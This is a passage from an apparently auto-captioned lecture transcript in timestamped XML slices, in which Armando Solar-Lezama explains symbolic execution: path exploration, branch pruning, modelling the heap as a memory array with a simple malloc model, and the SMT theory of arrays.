            <slice>
              <time_slice>1:01:46</time_slice>
              <text_slice>They will start asking questions
like, hey, the random execution</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:50</time_slice>
              <text_slice>went down this branch.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:51</time_slice>
              <text_slice>What if I flip this branch?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:52</time_slice>
              <text_slice>What if I flip this branch?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:54</time_slice>
              <text_slice>What if I flip this branch?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:55</time_slice>
              <text_slice>What happens in those paths?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:57</time_slice>
              <text_slice>Can be particularly
useful, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:59</time_slice>
              <text_slice>if we have a good test suite.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:01</time_slice>
              <text_slice>And you run your test suite
and you find, OK, there</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:04</time_slice>
              <text_slice>is this piece of code that
nothing in my test suite</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:07</time_slice>
              <text_slice>exercised.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:08</time_slice>
              <text_slice>So what you can do is you can
take the path that got closest</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:12</time_slice>
              <text_slice>to exercising that,
and then ask, hey,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:15</time_slice>
              <text_slice>can I change this path so that
it goes down this direction</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:19</time_slice>
              <text_slice>instead?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:20</time_slice>
              <text_slice>And so in general,
the moment you</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:25</time_slice>
              <text_slice>try to do all paths
simultaneously</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:28</time_slice>
              <text_slice>the constraints start
becoming intractable.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:31</time_slice>
              <text_slice>And it's the kind
of thing that you</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:33</time_slice>
              <text_slice>can do if you're doing
one function at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:37</time_slice>
              <text_slice>For example, if you're
doing one function at a time</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:39</time_slice>
              <text_slice>then it is generally feasible
to explore all the paths</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:42</time_slice>
              <text_slice>in a function together.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:43</time_slice>
              <text_slice>If you're trying to do
larger units, then generally</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:47</time_slice>
              <text_slice>you have to go with path
by path exploration.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:53</time_slice>
              <text_slice>Are there other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:56</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:57</time_slice>
              <text_slice>AUDIENCE: You referenced
how [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:00</time_slice>
              <text_slice>How does it do that again?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:02</time_slice>
              <text_slice>What's the [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:04</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: So the
most important one really is</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:08</time_slice>
              <text_slice>this idea that for every branch,
you check your constraints</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:13</time_slice>
              <text_slice>to check whether that branch
can actually go both ways,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:17</time_slice>
              <text_slice>because if it cannot go both
ways then you save a lot just</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:23</time_slice>
              <text_slice>going in this direction
of where it can't go.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:26</time_slice>
              <text_slice>Beyond that I don't remember
the specific strategy</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:28</time_slice>
              <text_slice>that they use for searching
paths that are more</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:32</time_slice>
              <text_slice>likely to give good results.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:37</time_slice>
              <text_slice>But pruning is really,
really important.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:43</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:44</time_slice>
              <text_slice>So far though we've been
talking mostly about toy code</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:48</time_slice>
              <text_slice>in the sense that it's only
integer variables, branches,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:53</time_slice>
              <text_slice>very simple stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:54</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:55</time_slice>
              <text_slice>What happens when you
have a program that</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:59</time_slice>
              <text_slice>is more complicated?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:01</time_slice>
              <text_slice>And in particular, what happens
when you have a program that</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:05</time_slice>
              <text_slice>involves the heap?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:08</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:08</time_slice>
              <text_slice>So the heap has
historically been</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:11</time_slice>
              <text_slice>the bane of all program
analysis, analysis</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>that were so clean and so
elegant in the days of Fortran,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:18</time_slice>
              <text_slice>completely blow up when you
try to run them on a C program</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:21</time_slice>
              <text_slice>where you're allocating
memory left and right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:23</time_slice>
              <text_slice>And you have aliasing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:25</time_slice>
              <text_slice>And you have all
the messiness that</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:28</time_slice>
              <text_slice>comes with dealing with
program allocated memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:32</time_slice>
              <text_slice>And with pointers and
pointer arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:34</time_slice>
              <text_slice>And this is one of the areas
where symbolic execution really</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:37</time_slice>
              <text_slice>shines in the ability
to actually reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:39</time_slice>
              <text_slice>about these kinds of programs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:42</time_slice>
              <text_slice>So how do we do it?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:44</time_slice>
              <text_slice>Right, so let's forget now
for a moment about branches,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:47</time_slice>
              <text_slice>and control flow.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:48</time_slice>
              <text_slice>We have a trivially
simple program here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:53</time_slice>
              <text_slice>All it's doing is it's
allocating some memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:56</time_slice>
              <text_slice>It's zeroing it out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>It's getting a new pointer
y from the pointer x.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:02</time_slice>
              <text_slice>It's writing something into y.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:04</time_slice>
              <text_slice>And then it's checking,
hey, is the value</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:08</time_slice>
              <text_slice>stored at pointer y equal to
the value stored at pointer x?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:12</time_slice>
              <text_slice>And just from your
basic knowledge of C</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:14</time_slice>
              <text_slice>you could see that, no.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:16</time_slice>
              <text_slice>Right, that this assertion is
actually violated because x got</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:22</time_slice>
              <text_slice>zeroed out and y
has 25 in there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:26</time_slice>
              <text_slice>but x is pointing to
a different location.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:30</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:33</time_slice>
              <text_slice>So far so good.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:35</time_slice>
              <text_slice>The way we're going to
model the heap and the way</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:37</time_slice>
              <text_slice>the heap is modeled in
a lot of these systems</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:41</time_slice>
              <text_slice>is by not thinking of
the heap as a heap,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:45</time_slice>
              <text_slice>but to thinking of
the heat the way</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:48</time_slice>
              <text_slice>C likes for you to think
of the heap, which is just</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:51</time_slice>
              <text_slice>a giant address base, a giant
array where you can put things</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:57</time_slice>
              <text_slice>into.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:58</time_slice>
              <text_slice>So what does that mean?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:00</time_slice>
              <text_slice>It means that we can
think of our program</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:03</time_slice>
              <text_slice>as having this very
big global array.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:07</time_slice>
              <text_slice>And we're just going
to call it MEM for now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:10</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:11</time_slice>
              <text_slice>And it's an array that
essentially is going</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:13</time_slice>
              <text_slice>to map addresses to values.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:17</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:18</time_slice>
              <text_slice>And what's an address?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:19</time_slice>
              <text_slice>Well, an address is
just a 64-bit value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>And what comes after you read
something from an address?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:30</time_slice>
              <text_slice>It depends on how
you're modeling memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:31</time_slice>
              <text_slice>If you're modeling it at the
byte level, then what comes out</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:36</time_slice>
              <text_slice>is a byte.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:37</time_slice>
              <text_slice>If you're modeling it
at the word level then</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:40</time_slice>
              <text_slice>what comes out of it is a word.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:42</time_slice>
              <text_slice>And depending on the kind of
bugs that you're interested in,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:45</time_slice>
              <text_slice>and whether things
like memory alignment</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:47</time_slice>
              <text_slice>are an issue for
you are not, you're</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:49</time_slice>
              <text_slice>going to model it a
little bit differently,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:51</time_slice>
              <text_slice>but generally memory
is just an array</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:53</time_slice>
              <text_slice>from an address to a value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:00</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:00</time_slice>
              <text_slice>So an address is
just an integer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:07</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:08</time_slice>
              <text_slice>It's in some sense not
that different from the way</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>C thinks I'm an address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:11</time_slice>
              <text_slice>It's just an integer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>It's just a value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:15</time_slice>
              <text_slice>It's just a 64-bit integer,
or a 32-bit integer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:18</time_slice>
              <text_slice>depending on your machine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:20</time_slice>
              <text_slice>It just a value that
indexes into that memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:22</time_slice>
              <text_slice>And that you can put
things in memory,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:24</time_slice>
              <text_slice>read them from the memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:27</time_slice>
              <text_slice>So things like
pointer arithmetic</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:30</time_slice>
              <text_slice>just becomes integer arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:33</time_slice>
              <text_slice>In practice there's a
little bit of desugaring</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:35</time_slice>
              <text_slice>that has to happen because in C
the pointer arithmetic actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:43</time_slice>
              <text_slice>knows about the types
of the pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:45</time_slice>
              <text_slice>And things will be incremented
proportional to the size,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:50</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:50</time_slice>
              <text_slice>So this would actually be x
plus 10 times the size of int.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:00</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:01</time_slice>
              <text_slice>But what's really
important is what</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:03</time_slice>
              <text_slice>happens when you're reading
and writing from memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:06</time_slice>
              <text_slice>So what used to be just a
pointer reference from y</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:11</time_slice>
              <text_slice>to write 25, is now just
I'm taking my memory array,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:17</time_slice>
              <text_slice>and I'm indexing it with y.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:19</time_slice>
              <text_slice>And I'm writing 25 to
that memory location.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:24</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:25</time_slice>
              <text_slice>And this assertion
now becomes, well, I</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:29</time_slice>
              <text_slice>am reading from
location y in memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>And I am reading from
location x in memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:35</time_slice>
              <text_slice>And I am comparing them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:36</time_slice>
              <text_slice>And I'm checking whether
they are the same or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>It's a very, very
simple reduction</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:41</time_slice>
              <text_slice>to go from program that uses the
heap to a program the just uses</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:46</time_slice>
              <text_slice>this giant global array
that represents the memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:51</time_slice>
              <text_slice>And now what that
means is that in order</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:53</time_slice>
              <text_slice>to reason about programs
that manipulate the heap</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:55</time_slice>
              <text_slice>you don't really have
to reason about programs</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:57</time_slice>
              <text_slice>that manipulate the heap.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:58</time_slice>
              <text_slice>As long as you have the
ability to reason about arrays,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:01</time_slice>
              <text_slice>you are good.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:02</time_slice>
              <text_slice>Now here's a simple
question though.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:04</time_slice>
              <text_slice>What about the malloc?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:07</time_slice>
              <text_slice>So one thing you can do is
you can say, well, malloc,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:11</time_slice>
              <text_slice>I can just take the C
implementation of malloc</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:16</time_slice>
              <text_slice>and actually implement
malloc like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:18</time_slice>
              <text_slice>And keep track of all the
pages that I have allocated</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:23</time_slice>
              <text_slice>and keep track of everything
that has been freed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:26</time_slice>
              <text_slice>And keep a free
list, and everything.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:29</time_slice>
              <text_slice>It turns out for
a lot of purposes</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>and for a lot of
classes of bugs,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:33</time_slice>
              <text_slice>you don't need malloc
to be that complicated.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:35</time_slice>
              <text_slice>In fact, you can get away with
a malloc that looks like this,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:39</time_slice>
              <text_slice>with a malloc that
just says, I'm</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:41</time_slice>
              <text_slice>going to keep a counter for
the next free memory location.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:49</time_slice>
              <text_slice>And whenever somebody
asks for an address,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:55</time_slice>
              <text_slice>that address I'm just
going to give this position</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:57</time_slice>
              <text_slice>and then increment the position.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:02</time_slice>
              <text_slice>And then return
rv, in this case.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:11</time_slice>
              <text_slice>So one of the thing that is
malloc is completely ignoring.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:17</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>Freeing, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:19</time_slice>
              <text_slice>This malloc says, yeah,
forget about freeing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>There's no freeing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:22</time_slice>
              <text_slice>We're just going to keep walking
through our memory allocating</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:26</time_slice>
              <text_slice>further, and further, and
further and that will be it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:30</time_slice>
              <text_slice>And we don't care
about freeing anything.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:34</time_slice>
              <text_slice>It also doesn't really
care about the fact</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:36</time_slice>
              <text_slice>that well, actually, there
are regions of memory where</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:39</time_slice>
              <text_slice>you shouldn't be writing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>There are special
addresses that have</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:42</time_slice>
              <text_slice>special meaning that are
reserved for the operating</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:44</time_slice>
              <text_slice>system.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:45</time_slice>
              <text_slice>It doesn't model
any of the things</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:47</time_slice>
              <text_slice>that actually make writing a
malloc function complicated,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:50</time_slice>
              <text_slice>but at a certain
level of abstraction,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:54</time_slice>
              <text_slice>if you're trying to reason
about some complicated code that</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:58</time_slice>
              <text_slice>does pointer manipulation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:59</time_slice>
              <text_slice>And you don't care
about freeing memory,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:02</time_slice>
              <text_slice>but you really
care about is, am I</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:04</time_slice>
              <text_slice>going to write past the end
of some buffer, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:08</time_slice>
              <text_slice>Then this malloc
might be good enough.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:10</time_slice>
              <text_slice>And this is actually that
happens very, very commonly</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:12</time_slice>
              <text_slice>when you're doing symbolic
execution of real code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:15</time_slice>
              <text_slice>A very important
step is the modeling</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:19</time_slice>
              <text_slice>of your library functions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:20</time_slice>
              <text_slice>And how you model
your library functions</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:22</time_slice>
              <text_slice>is going to have a huge
impact on the one hand</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:25</time_slice>
              <text_slice>on the performance and the
scalability of the analysis,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:30</time_slice>
              <text_slice>but on the other hand,
on the precision.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:32</time_slice>
              <text_slice>So if you have a Mickey Mouse
model of malloc like this,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:35</time_slice>
              <text_slice>it's going to be
very, very fast,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:37</time_slice>
              <text_slice>but there are going to be
certain classes of bugs</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:41</time_slice>
              <text_slice>that you won't be able to catch.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:43</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:43</time_slice>
              <text_slice>So and this model, for
example, I'm completely</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:45</time_slice>
              <text_slice>ignoring the allocations.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:46</time_slice>
              <text_slice>So if I have a bug
because somebody</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:48</time_slice>
              <text_slice>is accessing unallocated space.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:51</time_slice>
              <text_slice>Well, I'm not going to find
it with this Mickey Mouse</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:56</time_slice>
              <text_slice>model of malloc.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:58</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:59</time_slice>
              <text_slice>So it's always a balance between
the precision of the analysis</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:04</time_slice>
              <text_slice>versus the efficiency.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:10</time_slice>
              <text_slice>And the more complicated your
models of standard functions</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>like malloc get,
the less scalable</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:17</time_slice>
              <text_slice>the analysis is going to be,
but for certain classes of bugs</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:20</time_slice>
              <text_slice>you will need those models.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>And one of the big things
in the [? Clee ?] paper</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:25</time_slice>
              <text_slice>was really having
reasonable models</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:27</time_slice>
              <text_slice>for all the different
libraries in C,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:31</time_slice>
              <text_slice>all the different
libraries that are</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:32</time_slice>
              <text_slice>needed in order to understand
what a program is actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:35</time_slice>
              <text_slice>doing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:39</time_slice>
              <text_slice>So, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:40</time_slice>
              <text_slice>So we've reduced the problem
of reasoning about the heap</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:42</time_slice>
              <text_slice>to a problem of reasoning
about a program with arrays,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:47</time_slice>
              <text_slice>but I haven't actually
told you how to reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:50</time_slice>
              <text_slice>about a program with arrays.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:52</time_slice>
              <text_slice>And it turns out
that most SMT solvers</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:55</time_slice>
              <text_slice>support a theory of arrays.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>And the idea is
if a is an array,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:01</time_slice>
              <text_slice>there's some notation to
say, well, take that array</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:03</time_slice>
              <text_slice>and create a new array
where location i has</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:07</time_slice>
              <text_slice>been updated to value e.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:10</time_slice>
              <text_slice>All right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:11</time_slice>
              <text_slice>So if I have array a and I
do this update operation,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:14</time_slice>
              <text_slice>and then I try to
read the value k,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>then the meaning
is that the value k</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:20</time_slice>
              <text_slice>is going to be
equal to the value k</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:22</time_slice>
              <text_slice>at a if k is different from i.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:25</time_slice>
              <text_slice>And it's going to be equal to
e if k is equal to i, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:29</time_slice>
              <text_slice>That's what updating
an array means.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:31</time_slice>
              <text_slice>That's what it means
to take an old array</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:33</time_slice>
              <text_slice>and update it to be a new array.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:40</time_slice>
              <text_slice>And the nice thing about this is
that if you have a formula that</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:44</time_slice>
              <text_slice>involves the theory of
arrays, so, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:47</time_slice>
              <text_slice>I started with the zero array
that is just zeros everywhere.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:51</time_slice>
              <text_slice>And then I wrote 5 into location
i, and 7 into location j.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:59</time_slice>
              <text_slice>And then I'm reading from k.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:00</time_slice>
              <text_slice>And then I'm checking whether
that's equal to 5 or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:04</time_slice>
              <text_slice>Then that can be expanded
by using this definition</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:10</time_slice>
              <text_slice>to something that says,
well, if k is equal to i</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:14</time_slice>
              <text_slice>then if k is equal to y,
and k is different from j,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:19</time_slice>
              <text_slice>then, yes, this is
going to be equal to 5.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:24</time_slice>
              <text_slice>And otherwise this is not
going to be equal to 5, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:30</time_slice>
              <text_slice>And in practice SMT solvers
don't just expand these</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:33</time_slice>
              <text_slice>into lots of Boolean formulas.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:36</time_slice>
              <text_slice>They, again, use
this back and forth</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:37</time_slice>
              <text_slice>strategy between a SAT
solver and an engine</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:41</time_slice>
              <text_slice>that is able to reason about
this theory of arrays in order</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:45</time_slice>
              <text_slice>to do it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:46</time_slice>
